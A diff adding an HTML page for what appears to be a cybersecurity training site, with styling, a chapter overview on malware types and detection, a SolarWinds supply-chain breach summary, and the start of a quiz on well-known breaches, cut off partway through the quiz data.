@@ -1,0 +1,1458 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cybersecurity PRO</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap');
+
+:root {
+  --bg:      #0b0f14;
+  --bg2:     #0f1520;
+  --surface: #141e2e;
+  --card:    #19243a;
+  --border:  #1e3050;
+  --border2: #2a4060;
+  --blue:    #3b82f6;
+  --blue2:   #60a5fa;
+  --blue3:   #93c5fd;
+  --cyan:    #06b6d4;
+  --cyan2:   #22d3ee;
+  --green:   #10b981;
+  --green2:  #34d399;
+  --red:     #ef4444;
+  --red2:    #f87171;
+  --amber:   #f59e0b;
+  --amber2:  #fbbf24;
+  --purple:  #8b5cf6;
+  --purple2: #a78bfa;
+  --text:    #e2eaf5;
+  --text-mid:#8ba3c0;
+  --text-dim:#3a5570;
+}
+
+* { box-sizing: border-box; margin: 0; padding: 0; }
+
+body {
+  font-family: 'Inter', sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+body::before {
+  content: '';
+  position: fixed; inset: 0;
+  background-image: radial-gradient(circle, rgba(59,130,246,0.025) 1px, transparent 1px);
+  background-size: 28px 28px;
+  pointer-events: none; z-index: 0;
+}
+
+body::after {
+  content: '';
+  position: fixed; top: -15%; right: -10%;
+  width: 60%; height: 60%;
+  background: radial-gradient(ellipse, rgba(59,130,246,0.05) 0%, transparent 60%);
+  pointer-events: none; z-index: 0;
+}
+
+.container { max-width: 1060px; margin: 0 auto; padding: 0 24px; position: relative; z-index: 1; }
+
+/* ── NAV ── */
+.nav {
+  position: sticky; top: 0; z-index: 100;
+  background: rgba(11,15,20,0.9);
+  backdrop-filter: blur(16px);
+  border-bottom: 1px solid var(--border);
+  height: 48px; display: flex; align-items: center;
+  padding: 0 24px; gap: 0;
+}
+
+.nav-brand {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 12px; font-weight: 600;
+  color: var(--blue2); margin-left: 20px;
+  letter-spacing: .5px; white-space: nowrap;
+}
+
+.nav-tabs { display: flex; height: 100%; overflow-x: auto; -webkit-overflow-scrolling: touch; }
+
+.nav-tab {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px; padding: 0 16px; height: 100%;
+  border: none; background: none; color: var(--text-dim);
+  cursor: pointer; border-bottom: 2px solid transparent;
+  transition: all .15s; white-space: nowrap;
+  display: flex; align-items: center; gap: 6px;
+}
+.nav-tab:hover { color: var(--text-mid); }
+.nav-tab.active { color: var(--blue2); border-bottom-color: var(--blue); font-weight: 600; }
+
+.nav-clock { margin-right: auto; font-family:'JetBrains Mono',monospace; font-size:10px; color:var(--text-dim); }
+
+/* ── HERO ── */
+.hero { padding: 56px 0 44px; border-bottom: 1px solid var(--border); }
+
+.hero-eyebrow {
+  font-family: 'JetBrains Mono', monospace;
+  font-size: 11px; letter-spacing: 2px; text-transform: uppercase;
+  color: var(--blue2); margin-bottom: 16px;
+  display: flex; align-items: center; gap: 10px;
+}
+.hero-eyebrow::before { content: '//'; color: var(--text-dim); }
+
+.hero h1 {
+  font-family: 'Inter', sans-serif;
+  font-size: clamp(40px, 7vw, 78px);
+  font-weight: 700; line-height: 1;
+  letter-spacing: -1px; margin-bottom: 16px;
+}
+.hero h1 .w1 { color: var(--text); }
+.hero h1 .w2 { color: var(--blue2); }
+
+.hero-desc {
+  font-size: 15px; color: var(--text-mid);
+  max-width: 520px; line-height: 1.75;
+  margin-bottom: 36px;
+}
+
+.stats-row {
+  display: inline-grid; grid-template-columns: repeat(4, auto);
+  border: 1px solid var(--border); border-radius: 8px;
+  overflow: hidden; background: var(--surface);
+}
+.stat { padding: 14px 22px; border-left: 1px solid var(--border); text-align: center; }
+.stat:first-child { border-left: none; }
+.stat-n { font-family:'JetBrains Mono',monospace; font-size:26px; font-weight:700; color:var(--blue2); display:block; line-height:1; }
+.stat-l { font-family:'JetBrains Mono',monospace; font-size:9px; color:var(--text-dim); letter-spacing:1.5px; text-transform:uppercase; margin-top:3px; display:block; }
+
+/* ── SECTIONS ── */
+.section { display: none; }
+.section.active { display: block; }
+.sec-inner { padding: 32px 0 64px; }
+
+/* ── CHAPTERS ── */
+.chapters { display: flex; flex-direction: column; gap: 2px; }
+
+.ch { background: var(--card); border: 1px solid var(--border); overflow: hidden; transition: border-color .2s; }
+.ch:first-child { border-radius: 10px 10px 0 0; }
+.ch:last-child  { border-radius: 0 0 10px 10px; }
+.ch:hover { border-color: var(--border2); }
+.ch.open  { border-color: rgba(59,130,246,.4); }
+
+.ch-trigger { padding: 16px 20px; cursor: pointer; display: flex; align-items: center; gap: 14px; user-select: none; }
+
+.ch-num { font-family:'JetBrains Mono',monospace; font-size:10px; color:var(--text-dim); min-width:44px; letter-spacing:1px; }
+
+.ch-icon { width:36px; height:36px; border:1px solid var(--border2); border-radius:6px; background:rgba(59,130,246,.08); display:flex; align-items:center; justify-content:center; font-size:17px; flex-shrink:0; }
+
+.ch-info { flex:1; min-width:0; }
+.ch-name { font-family:'Inter',sans-serif; font-size:15px; font-weight:600; color:var(--text); margin-bottom:2px; line-height:1.2; }
+.ch-desc { font-size:12px; color:var(--text-dim); overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+
+.ch-meta { display:flex; align-items:center; gap:8px; flex-shrink:0; }
+.ch-time { font-family:'JetBrains Mono',monospace; font-size:10px; color:var(--text-dim); }
+.ch-chev { color:var(--text-dim); font-size:13px; transition:transform .3s, color .2s; }
+.ch.open .ch-chev { transform:rotate(90deg); color:var(--blue2); }
+
+.chip { font-family:'JetBrains Mono',monospace; font-size:9px; padding:2px 7px; border-radius:4px; letter-spacing:.5px; }
+.chip-b { background:rgba(59,130,246,.1); color:var(--blue2); border:1px solid rgba(59,130,246,.25); }
+.chip-r { background:rgba(239,68,68,.1); color:var(--red2); border:1px solid rgba(239,68,68,.2); }
+.chip-g { background:rgba(16,185,129,.1); color:var(--green2); border:1px solid rgba(16,185,129,.2); }
+.chip-a { background:rgba(245,158,11,.1); color:var(--amber2); border:1px solid rgba(245,158,11,.2); }
+.chip-p { background:rgba(139,92,246,.1); color:var(--purple2); border:1px solid rgba(139,92,246,.2); }
+.chip-c { background:rgba(6,182,212,.1); color:var(--cyan2); border:1px solid rgba(6,182,212,.2); }
+
+.ch-body { display:none; border-top:1px solid var(--border); }
+.ch.open .ch-body { display:block; }
+.ch-inner { padding: 22px 20px; }
+
+.ch-grid { display:grid; grid-template-columns:1fr 1fr; gap:20px; }
+@media(max-width:680px){ .ch-grid { grid-template-columns:1fr; } }
+
+.sec-label {
+  font-family:'JetBrains Mono',monospace; font-size:9px;
+  letter-spacing:2px; text-transform:uppercase; color:var(--blue2);
+  margin-bottom:10px; display:flex; align-items:center; gap:8px;
+}
+.sec-label::after { content:''; flex:1; height:1px; background:var(--border); }
+
+.learn-list { display:flex; flex-direction:column; gap:7px; }
+.li {
+  font-size:13px; color:var(--text-mid); line-height:1.55;
+  display:flex; gap:10px; align-items:flex-start;
+}
+.li::before { content:'→'; color:var(--blue2); font-family:'JetBrains Mono',monospace; font-size:11px; margin-top:2px; flex-shrink:0; }
+
+.chips-row { display:flex; gap:5px; flex-wrap:wrap; margin-top:10px; }
+
+/* INCIDENT BOX */
+.incident {
+  background:linear-gradient(135deg,rgba(239,68,68,.05),rgba(248,113,113,.03));
+  border:1px solid rgba(239,68,68,.2);
+  border-right:4px solid var(--red);
+  border-radius:8px; padding:16px 17px;
+}
+.inc-badge { font-family:'JetBrains Mono',monospace; font-size:9px; letter-spacing:1.5px; color:var(--red2); text-transform:uppercase; margin-bottom:7px; }
+.inc-title { font-family:'Inter',sans-serif; font-size:14px; font-weight:600; color:var(--text); margin-bottom:8px; line-height:1.3; }
+.inc-desc { font-size:12px; color:var(--text-mid); line-height:1.75; }
+.inc-desc strong { color:var(--amber2); font-weight:600; }
+
+/* CODE */
+.code-block {
+  background:#060b12; border:1px solid var(--border2); border-radius:7px;
+  padding:14px; font-family:'JetBrains Mono',monospace;
+  font-size:11.5px; line-height:1.8; overflow-x:auto; margin-top:12px;
+}
+.cp { color:var(--blue2); }
+.cf { color:var(--amber2); }
+.cs { color:var(--green2); }
+.cc { color:var(--text-dim); font-style:italic; }
+.co { color:var(--red2); }
+.ch_ { color:var(--cyan2); }
+.ck { color:var(--purple2); }
+
+/* TIP */
+.tip-box {
+  margin-top:14px; background:rgba(59,130,246,.04);
+  border:1px solid rgba(59,130,246,.15); border-radius:6px;
+  padding:11px 14px; font-size:13px; color:var(--text-mid);
+  line-height:1.65; display:flex; gap:10px;
+}
+.tip-box strong { color:var(--blue2); }
+
+/* ── LABS ── */
+.labs-list { display:flex; flex-direction:column; gap:14px; }
+
+.lab { background:var(--card); border:1px solid var(--border); border-radius:8px; overflow:hidden; }
+
+.lab-head { padding:16px 20px; display:flex; align-items:center; gap:12px; cursor:pointer; border-bottom:1px solid transparent; transition:background .15s; }
+.lab-head:hover { background:var(--surface); }
+.lab.open .lab-head { border-bottom-color:var(--border); background:var(--surface); }
+
+.lab-emoji { font-size:22px; }
+.lab-info { flex:1; }
+.lab-name { font-family:'Inter',sans-serif; font-size:14px; font-weight:600; color:var(--text); margin-bottom:2px; }
+.lab-sub  { font-size:12px; color:var(--text-dim); }
+
+.diff { font-family:'JetBrains Mono',monospace; font-size:9px; padding:3px 7px; border-radius:4px; letter-spacing:.5px; }
+.d-easy   { background:rgba(16,185,129,.1); color:var(--green2); border:1px solid rgba(16,185,129,.25); }
+.d-medium { background:rgba(245,158,11,.1); color:var(--amber2); border:1px solid rgba(245,158,11,.25); }
+.d-hard   { background:rgba(239,68,68,.1);  color:var(--red2);   border:1px solid rgba(239,68,68,.25); }
+
+.lab-chev { color:var(--text-dim); font-size:13px; transition:transform .3s; }
+.lab.open .lab-chev { transform:rotate(90deg); color:var(--blue2); }
+
+.lab-body { display:none; padding:20px; }
+.lab.open .lab-body { display:block; }
+
+.lab-goal { font-size:14px; color:var(--text-mid); border-right:3px solid var(--blue); padding-right:13px; margin-bottom:16px; line-height:1.65; }
+
+.lab-steps { display:flex; flex-direction:column; gap:8px; margin-bottom:14px; }
+.lab-step { display:flex; gap:10px; font-size:13px; color:var(--text-mid); line-height:1.55; align-items:flex-start; }
+.sn {
+  font-family:'JetBrains Mono',monospace; font-size:10px;
+  color:var(--blue2); background:rgba(59,130,246,.1); border:1px solid rgba(59,130,246,.2);
+  border-radius:3px; padding:1px 6px; min-width:28px; text-align:center;
+  margin-top:2px; flex-shrink:0;
+}
+
+/* ANSWER */
+.ans-btn {
+  display:inline-flex; align-items:center; gap:7px; margin-top:12px;
+  padding:8px 16px; background:transparent;
+  border:1px solid rgba(59,130,246,.3); color:var(--blue2);
+  border-radius:5px; font-family:'JetBrains Mono',monospace;
+  font-size:10px; letter-spacing:.5px; cursor:pointer; transition:all .2s;
+}
+.ans-btn:hover { background:rgba(59,130,246,.08); }
+.ans-btn.open  { background:rgba(59,130,246,.08); border-color:var(--blue2); }
+
+.ans-box {
+  display:none; margin-top:12px;
+  background:rgba(59,130,246,.03); border:1px solid rgba(59,130,246,.15);
+  border-radius:8px; padding:18px; animation:fadeUp .2s ease;
+}
+.ans-box.show { display:block; }
+
+@keyframes fadeUp { from{opacity:0;transform:translateY(-5px)} to{opacity:1;transform:translateY(0)} }
+
+.ans-head {
+  font-family:'JetBrains Mono',monospace; font-size:9px; letter-spacing:2px;
+  text-transform:uppercase; color:var(--blue2); margin-bottom:12px;
+  display:flex; align-items:center; gap:8px;
+}
+.ans-head::after { content:''; flex:1; height:1px; background:rgba(59,130,246,.2); }
+
+.ans-item { display:flex; gap:10px; margin-bottom:10px; font-size:13px; color:var(--text-mid); line-height:1.65; align-items:flex-start; }
+.ans-item:last-child { margin-bottom:0; }
+.an {
+  font-family:'JetBrains Mono',monospace; font-size:10px;
+  color:var(--blue2); background:rgba(59,130,246,.1); border:1px solid rgba(59,130,246,.2);
+  border-radius:3px; padding:1px 5px; min-width:26px; text-align:center;
+  flex-shrink:0; margin-top:2px;
+}
+.ans-note { background:rgba(6,182,212,.05); border-left:3px solid var(--cyan); padding:9px 13px; border-radius:5px; font-size:12px; color:var(--text-mid); line-height:1.7; margin-top:10px; }
+.ans-warn { background:rgba(239,68,68,.05); border:1px solid rgba(239,68,68,.2); padding:9px 13px; border-radius:5px; font-size:12px; color:var(--red2); line-height:1.65; margin-top:10px; }
+
+/* ── QUIZ ── */
+.quiz-top { background:var(--card); border:1px solid var(--border); border-radius:10px; padding:28px; text-align:center; margin-bottom:22px; }
+.quiz-top h2 { font-family:'Inter',sans-serif; font-size:26px; font-weight:700; color:var(--text); margin-bottom:7px; }
+.quiz-top p  { font-size:13px; color:var(--text-dim); }
+.q-prog-bg { background:rgba(255,255,255,.05); border-radius:20px; height:3px; margin:16px 0 0; overflow:hidden; }
+.q-prog { height:100%; border-radius:20px; background:var(--blue); transition:width .4s; }
+.q-prog-lbl { font-family:'JetBrains Mono',monospace; font-size:10px; color:var(--text-dim); text-align:left; margin-top:4px; }
+
+.q-list { display:flex; flex-direction:column; gap:11px; }
+.q-card { background:var(--card); border:1px solid var(--border); border-radius:8px; padding:20px; transition:border-color .3s; }
+.q-card.c-ok   { border-color:var(--green);  background:rgba(16,185,129,.03); }
+.q-card.c-fail { border-color:var(--red);    background:rgba(239,68,68,.03); }
+.q-top { display:flex; justify-content:space-between; align-items:center; margin-bottom:10px; }
+.q-idx { font-family:'JetBrains Mono',monospace; font-size:9px; color:var(--blue2); letter-spacing:2px; }
+.q-tag { font-family:'JetBrains Mono',monospace; font-size:9px; color:var(--text-dim); border:1px solid var(--border); padding:1px 6px; border-radius:3px; }
+.q-text { font-size:15px; font-weight:600; color:var(--text); margin-bottom:13px; line-height:1.5; }
+.q-opts { display:grid; grid-template-columns:1fr 1fr; gap:7px; }
+@media(max-width:500px){ .q-opts { grid-template-columns:1fr; } }
+.q-opt { padding:10px 13px; border:1px solid var(--border); border-radius:5px; background:var(--surface); cursor:pointer; font-size:12px; color:var(--text-mid); text-align:right; transition:all .15s; line-height:1.45; }
+.q-opt:hover:not(.locked) { border-color:var(--blue); color:var(--blue2); background:rgba(59,130,246,.06); }
+.q-opt.hit  { border-color:var(--green)!important; background:rgba(16,185,129,.1)!important; color:var(--green2)!important; font-weight:600; }
+.q-opt.miss { border-color:var(--red)!important; background:rgba(239,68,68,.1)!important; color:var(--red2)!important; }
+.q-opt.locked { cursor:default; }
+.q-exp { margin-top:10px; padding:10px 13px; background:rgba(59,130,246,.05); border-right:3px solid var(--blue2); border-radius:5px; font-size:12px; color:var(--text-mid); line-height:1.7; display:none; }
+.q-exp.show { display:block; animation:fadeUp .2s ease; }
+
+.score-box { background:var(--card); border:1px solid var(--border2); border-radius:10px; padding:44px 28px; text-align:center; margin-top:22px; display:none; position:relative; overflow:hidden; }
+.score-box::before { content:''; position:absolute; top:0; left:0; right:0; height:2px; background:linear-gradient(90deg,transparent,var(--blue),var(--cyan),var(--blue),transparent); }
+.score-box.show { display:block; animation:fadeUp .4s ease; }
+.score-big { font-family:'Inter',sans-serif; font-size:76px; font-weight:700; color:var(--blue2); line-height:1; letter-spacing:-2px; }
+.score-big .frac { font-size:34px; color:var(--text-dim); vertical-align:middle; }
+.score-pct { font-family:'JetBrains Mono',monospace; font-size:13px; color:var(--text-dim); margin-top:5px; }
+.score-msg { font-size:17px; font-weight:600; color:var(--text); margin-top:12px; }
+.score-sub { font-family:'JetBrains Mono',monospace; font-size:12px; color:var(--text-dim); margin-top:5px; }
+.score-acts { display:flex; justify-content:center; gap:12px; margin-top:22px; flex-wrap:wrap; }
+
+.btn { font-family:'JetBrains Mono',monospace; font-size:11px; padding:11px 22px; border-radius:5px; cursor:pointer; transition:all .2s; letter-spacing:.5px; border:1px solid; min-height:42px; display:inline-flex; align-items:center; }
+.btn-blue  { background:var(--blue); color:#fff; border-color:var(--blue); font-weight:700; }
+.btn-blue:hover { box-shadow:0 4px 16px rgba(59,130,246,.4); }
+.btn-ghost { background:transparent; color:var(--text-dim); border-color:var(--border2); }
+.btn-ghost:hover { border-color:var(--blue2); color:var(--blue2); }
+
+/* ── GAME ── */
+.game-shell { background:var(--surface); border:1px solid var(--border2); border-radius:10px; overflow:hidden; }
+.game-bar { background:var(--card); border-bottom:1px solid var(--border); padding:10px 16px; display:flex; align-items:center; gap:10px; }
+.gbar-dots { display:flex; gap:5px; }
+.gd { width:10px; height:10px; border-radius:50%; }
+.gd-r{background:#ff5f57;} .gd-y{background:#febc2e;} .gd-g{background:#28c840;}
+.game-title-bar { font-family:'JetBrains Mono',monospace; font-size:11px; color:var(--text-dim); margin-right:auto; }
+.game-scorebar { font-family:'JetBrains Mono',monospace; font-size:11px; display:flex; gap:14px; }
+.gs-s{color:var(--amber2);} .gs-l{color:var(--red2);} .gs-lv{color:var(--purple2);}
+
+.game-body { padding:26px; }
+.game-q { font-family:'Inter',sans-serif; font-size:18px; font-weight:600; color:var(--text); margin-bottom:7px; line-height:1.35; }
+.game-hint { font-size:13px; color:var(--text-dim); margin-bottom:20px; font-style:italic; }
+.game-opts { display:grid; grid-template-columns:repeat(4,1fr); gap:9px; margin-bottom:16px; }
+@media(max-width:580px){ .game-opts { grid-template-columns:repeat(2,1fr); } }
+
+.g-opt { padding:13px 6px; border-radius:7px; cursor:pointer; text-align:center; font-family:'JetBrains Mono',monospace; font-size:13px; font-weight:600; transition:all .15s; border:2px solid transparent; user-select:none; }
+.go-cia     { background:rgba(59,130,246,.12); color:var(--blue2);   border-color:rgba(59,130,246,.3); }
+.go-threat  { background:rgba(239,68,68,.1);   color:var(--red2);    border-color:rgba(239,68,68,.3); }
+.go-crypto  { background:rgba(139,92,246,.1);  color:var(--purple2); border-color:rgba(139,92,246,.3); }
+.go-network { background:rgba(6,182,212,.1);   color:var(--cyan2);   border-color:rgba(6,182,212,.3); }
+.go-malware { background:rgba(245,158,11,.1);  color:var(--amber2);  border-color:rgba(245,158,11,.3); }
+.go-pentest { background:rgba(16,185,129,.1);  color:var(--green2);  border-color:rgba(16,185,129,.3); }
+.go-soc     { background:rgba(59,130,246,.12); color:var(--blue3);   border-color:rgba(59,130,246,.25); }
+.go-cloud   { background:rgba(139,92,246,.1);  color:var(--purple2); border-color:rgba(139,92,246,.25); }
+
+.g-opt:hover:not(.locked) { transform:translateY(-2px); box-shadow:0 5px 14px rgba(0,0,0,.35); }
+.g-opt.correct { transform:scale(1.05); box-shadow:0 0 18px rgba(16,185,129,.4); }
+.g-opt.wrong   { opacity:.4; transform:scale(.95); }
+.g-opt.locked  { cursor:default; }
+.g-opt small   { display:block; font-size:9px; font-weight:400; opacity:.7; margin-top:2px; }
+
+.game-feedback { text-align:center; font-size:14px; font-weight:600; min-height:22px; }
+.fb-ok  { color:var(--green2); }
+.fb-err { color:var(--red2); }
+
+.game-prog-wrap { background:rgba(255,255,255,.05); border-radius:20px; height:3px; margin-top:14px; overflow:hidden; }
+.game-prog-fill { height:100%; background:linear-gradient(90deg,var(--blue),var(--cyan)); border-radius:20px; transition:width .4s; }
+
+.game-end { display:none; text-align:center; padding:36px 20px; }
+.game-end.show { display:block; }
+.ge-emoji { font-size:50px; margin-bottom:12px; }
+.ge-title { font-family:'Inter',sans-serif; font-size:24px; font-weight:700; color:var(--text); margin-bottom:7px; }
+.ge-score { font-family:'JetBrains Mono',monospace; font-size:13px; color:var(--blue2); margin-bottom:8px; }
+.ge-msg   { font-size:13px; color:var(--text-dim); margin-bottom:22px; }
+
+.game-help { margin-top:14px; background:rgba(59,130,246,.04); border:1px solid rgba(59,130,246,.15); border-radius:6px; padding:11px 15px; font-family:'JetBrains Mono',monospace; font-size:11px; color:var(--text-dim); line-height:1.65; }
+
+/* ── FOOTER ── */
+.site-footer { text-align:center; padding:26px; border-top:1px solid var(--border); }
+.site-footer p { font-family:'JetBrains Mono',monospace; font-size:10px; color:var(--text-dim); letter-spacing:2px; }
+
+::-webkit-scrollbar { width:4px; height:4px; }
+::-webkit-scrollbar-track { background:var(--bg); }
+::-webkit-scrollbar-thumb { background:var(--border2); border-radius:2px; }
+::-webkit-scrollbar-thumb:hover { background:var(--blue); }
+
+/* ── MOBILE ── */
+@media(max-width:768px){
+  .container { padding:0 16px; }
+  .nav { padding:0 14px; }
+  .nav-clock { display:none; }
+  .hero { padding:36px 0 28px; }
+  .stats-row { width:100%; grid-template-columns:1fr 1fr; }
+  .stat { border-left:none; border-top:1px solid var(--border); }
+  .stat:nth-child(1),.stat:nth-child(2) { border-top:none; }
+  .stat:nth-child(even) { border-left:1px solid var(--border); }
+}
+@media(max-width:480px){
+  .container { padding:0 12px; }
+  .nav { padding:0 12px; height:46px; }
+  .nav-tab { font-size:10px; padding:0 10px; }
+  .nav-brand { font-size:11px; margin-left:10px; }
+  .hero { padding:24px 0 20px; }
+  .hero h1 { font-size:clamp(34px,11vw,52px); }
+  .hero-desc { font-size:13px; }
+  .stat-n { font-size:22px; }
+  .sec-inner { padding:20px 0 44px; }
+  .ch-trigger { padding:11px 12px; gap:9px; }
+  .ch-icon { width:30px; height:30px; font-size:14px; }
+  .ch-name { font-size:13px; }
+  .ch-desc { display:none; }
+  .ch-time { display:none; }
+  .ch-inner { padding:14px 12px; }
+  .learn-list .li { font-size:12px; }
+  .code-block { font-size:10.5px; }
+  .inc-desc { font-size:11px; }
+  .lab-head { padding:12px 13px; }
+  .lab-name { font-size:13px; }
+  .lab-body { padding:14px 13px; }
+  .lab-goal { font-size:13px; }
+  .lab-step { font-size:12px; }
+  .ans-item { font-size:12px; }
+  .game-body { padding:16px 13px; }
+  .game-q { font-size:16px; }
+  .game-opts { gap:7px; }
+  .g-opt { font-size:12px; padding:11px 5px; }
+  .quiz-top h2 { font-size:22px; }
+  .q-card { padding:14px 12px; }
+  .q-text { font-size:14px; }
+  .q-opts { grid-template-columns:1fr; gap:6px; }
+  .q-opt { font-size:12px; padding:10px 12px; min-height:44px; display:flex; align-items:center; }
+  .score-big { font-size:58px; }
+  .score-acts { flex-direction:column; }
+  .btn { width:100%; justify-content:center; }
+  .site-footer { padding:18px 12px; }
+}
+@supports (padding: max(0px)) {
+  .nav { padding-left:max(16px,env(safe-area-inset-left)); padding-right:max(16px,env(safe-area-inset-right)); }
+  .container { padding-left:max(12px,env(safe-area-inset-left)); padding-right:max(12px,env(safe-area-inset-right)); }
+  .site-footer { padding-bottom:max(18px,env(safe-area-inset-bottom)); }
+}
+
+<style id="emu-css">
+.emu-wrap{margin-top:18px;border:1px solid var(--border2);border-radius:10px;overflow:hidden;background:var(--code-bg);}
+.emu-bar{background:var(--surface);border-bottom:1px solid var(--border);padding:8px 14px;display:flex;align-items:center;gap:8px;}
+.emu-dots{display:flex;gap:5px;}
+.ed{width:10px;height:10px;border-radius:50%;}
+.ed-r{background:#ff5f57;}.ed-y{background:#febc2e;}.ed-g{background:#28c840;}
+.emu-title{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--text-dim);margin-right:auto;}
+.emu-run-btn{font-family:'JetBrains Mono',monospace;font-size:10px;font-weight:600;padding:5px 14px;background:var(--blue);color:#fff;border:none;border-radius:4px;cursor:pointer;transition:all .15s;letter-spacing:.5px;}
+.emu-run-btn:hover{background:var(--blue2);}
+.emu-run-btn.running{background:var(--amber);color:#000;}
+.emu-clr-btn{font-family:'JetBrains Mono',monospace;font-size:10px;padding:5px 10px;background:transparent;color:var(--text-dim);border:1px solid var(--border2);border-radius:4px;cursor:pointer;transition:all .15s;}
+.emu-clr-btn:hover{border-color:var(--blue2);color:var(--blue2);}
+.emu-iw{padding:10px 14px;border-bottom:1px solid var(--border);}
+.emu-lbl{font-family:'JetBrains Mono',monospace;font-size:9px;color:var(--text-dim);letter-spacing:1px;margin-bottom:5px;}
+.emu-sel{width:100%;background:var(--surface);border:1px solid var(--border2);color:var(--text);padding:6px 10px;border-radius:5px;font-family:'JetBrains Mono',monospace;font-size:11px;outline:none;margin-bottom:6px;}
+.emu-sel:focus{border-color:var(--blue2);}
+.emu-inp{background:var(--surface);border:1px solid var(--border2);color:var(--text);padding:7px 10px;border-radius:5px;font-family:'JetBrains Mono',monospace;font-size:11px;outline:none;width:100%;}
+.emu-inp:focus{border-color:var(--blue2);}
+.emu-ta{width:100%;background:var(--surface);border:1px solid var(--border2);color:var(--text);padding:8px 10px;border-radius:5px;font-family:'JetBrains Mono',monospace;font-size:11px;outline:none;resize:vertical;min-height:55px;line-height:1.6;}
+.emu-ta:focus{border-color:var(--blue2);}
+.emu-row{display:flex;gap:7px;flex-wrap:wrap;}
+.emu-out{min-height:130px;max-height:300px;overflow-y:auto;padding:13px 15px;font-family:'JetBrains Mono',monospace;font-size:11.5px;line-height:1.85;color:var(--text-mid);}
+.emu-out .ok{color:#34d399;}.emu-out .err{color:#f87171;}.emu-out .key{color:#818cf8;}.emu-out .val{color:#fbbf24;}.emu-out .dim{color:#475569;}.emu-out .warn{color:#fbbf24;}.emu-out .hi{color:#22d3ee;}.emu-out .em{color:#475569;font-style:italic;}.emu-out .red{color:#f43f5e;}
+</style>
+</style>
+
+<script src="/_bridge.js"></script>
+</head>
+<body>
+<div class="ch open" id="c5">
+  <div class="ch-trigger" onclick="toggleCh('c5')">
+    <span class="ch-num">05/08</span><div class="ch-icon">🦠</div>
+    <div class="ch-info">
+      <div class="ch-name">Malware — Types, Detection & Prevention</div>
+      <div class="ch-desc">Ransomware, Trojans, Rootkits, APT, Supply Chain, Indicators of Compromise</div>
+    </div>
+    <div class="ch-meta"><span class="chip chip-r">MALWARE</span><span class="ch-time">⏱ 50m</span><span class="ch-chev">▶</span></div>
+  </div>
+  <div class="ch-body" style="display:block"><div class="ch-inner">
+    <div class="ch-grid">
+      <div>
+        <div class="sec-label">What You'll Learn</div>
+        <div class="learn-list">
+          <div class="li">Ransomware — Double Extortion, RaaS model, attack phases</div>
+          <div class="li">APT (Advanced Persistent Threat) — nation-state actors, long-term persistence</div>
+          <div class="li">Supply Chain Attack — injecting malware into legitimate software</div>
+          <div class="li">Rootkits — deep concealment at the Kernel level</div>
+          <div class="li">IOC — Indicators of Compromise: File Hashes, IPs, Domains</div>
+          <div class="li">EDR — Endpoint Detection and Response, Behavioral Analysis</div>
+        </div>
+      </div>
+      <div>
+        <div class="sec-label">Famous Breach</div>
+        <div class="incident">
+          <div class="inc-badge">🔴 SUPPLY CHAIN — 2020 / SolarWinds</div>
+          <div class="inc-title">Backdoor in a Legitimate Software Update Hit 18,000 Organizations</div>
+          <div class="inc-desc">
+            APT29 — a Russian hacker group — successfully injected malicious code directly into the build process of SolarWinds Orion, a network monitoring tool used by US government agencies, Fortune 500 companies, and the US Treasury.<br><br>
+            <strong>The malicious code (SUNBURST) was hidden inside a legitimate update</strong> that organizations downloaded willingly. 18,000 organizations installed it. The backdoor "slept" for 12-14 days before activating (to evade Sandboxes). It then beaconed to Command & Control servers and granted full access. The breach was only discovered when another security firm (FireEye) noticed someone trying to register an additional MFA device on an employee account.
+          </div>
+        </div>
+      </div>
+    </div>
+  </div></div>
+</div>
+<script>
+// ── Clock ──
+setInterval(() => {
+  const el = document.getElementById('clk');
+  if (el) el.textContent = new Date().toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit'}) + ' 🔐';
+}, 1000);
+
+// ── Tabs ──
+function switchTab(id, el) {
+  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+  document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
+  const sec = document.getElementById(id);
+  if (sec) sec.classList.add('active');
+  if (el && el.classList) el.classList.add('active');
+  if (id === 'game') startGame();
+}
+
+// ── Chapters / Labs ──
+function toggleCh(id)  { document.getElementById(id).classList.toggle('open'); }
+function toggleLab(id) { document.getElementById(id).classList.toggle('open'); }
+const _lb1 = document.getElementById('lb1'); if (_lb1) _lb1.classList.add('open');
+
+// ── Answer Toggle ──
+function toggleAns(id) {
+  const box  = document.getElementById(id);
+  const btn  = box.previousElementSibling;
+  const icon = document.getElementById(id + 'i');
+  const open = box.classList.contains('show');
+  box.classList.toggle('show');
+  btn.classList.toggle('open');
+  if (icon) icon.textContent = open ? '▶' : '▼';
+  btn.childNodes[1].textContent = ' ' + (open ? 'Show Answers' : 'Hide Answers');
+}
+
+// ── Quiz ──
+const QS = [
+  {q:"Which CIA Triad component was violated in the Equifax 2017 breach?",tag:"CIA",opts:["Availability only","Integrity only","All three components","No component was violated"],ans:2,exp:"In the Equifax breach all three were violated: Confidentiality (143M records stolen), Integrity (unclear what else was modified), Availability (service shut down). The breach was via CVE-2017-5638 in Apache Struts — a patch had been available for two months."},
+  {q:"What type of attack did the 17-year-old use in the Twitter 2020 breach?",tag:"Social Eng",opts:["SQL Injection","Zero-Day Exploit","Vishing — called an employee and impersonated IT","Ransomware"],ans:2,exp:"A 17-year-old from Florida called Twitter employees, impersonated an internal IT staffer, and convinced them to hand over access to an admin tool. This is a Vishing (Voice Phishing) attack. No sophisticated code — pure social engineering."},
+  {q:"What was the entry vector in the Colonial Pipeline 2021 attack?",tag:"Network",opts:["Zero-Day in Firewall","A stolen VPN password from the dark web, no MFA","SQL Injection","Phishing email to CEO"],ans:1,exp:"DarkSide entered via a legacy VPN account whose password was found on the Dark Web from a previous breach. The account had no MFA. Two simple controls would have prevented it: MFA and Password Rotation."},
